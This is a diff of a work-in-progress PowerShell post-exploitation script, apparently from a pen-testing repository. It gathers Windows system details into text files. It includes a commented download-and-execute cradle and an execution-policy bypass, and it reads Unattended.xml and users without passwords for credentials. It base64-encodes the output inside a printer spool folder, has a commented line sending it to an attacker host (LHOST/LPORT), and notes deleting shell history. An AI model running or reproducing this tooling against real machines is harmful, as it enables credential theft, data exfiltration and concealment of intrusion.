@@ -1,5 +1,4 @@
 #Work in progress!!!
-#Download webenum.ps1
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/webenum.ps1')"
 #powershell Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy Bypass     change so no input needed
 Unblock-File -Path .\webenum.ps1
@@ -25,8 +24,6 @@ Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File 
 Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" | Out-File -FilePath .\1.txt -Append 
 # C:\ Owner
 Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
-# SPN
-
 # Cmdlets
 Get-Command -CommandType Cmdlet | measure | Out-File -FilePath .\1.txt -Append  
 # Execution policy
@@ -41,8 +38,6 @@ Get-Hotfix | Out-File -FilePath .\1.txt -Append
 Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
 # get running processes
 Get-Process | Out-File -FilePath .\1.txt -Append 
-# print bash history files then delete
-Get-content "C:\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | Out-File -FilePath .\1.txt -Append 
 # ports
 echo "Scanning Top 20 Open Ports..." | Out-File -FilePath .\2.txt -Append 
 echo "21" | Out-File -FilePath .\2.txt -Append 
@@ -78,8 +73,8 @@ foreach($port in $text_port){
 
 }
 # encode base64
-certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 1.txt
-rm 2.txt
+certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 2.txt
+rm 1.txt
 #send output file
 #Invoke-WebRequest "http://<LHOST>:<LPORT>/2.txt" -OutFile "2.txt"	                                                                                     #Change L IP / PORT
 # remove bash history
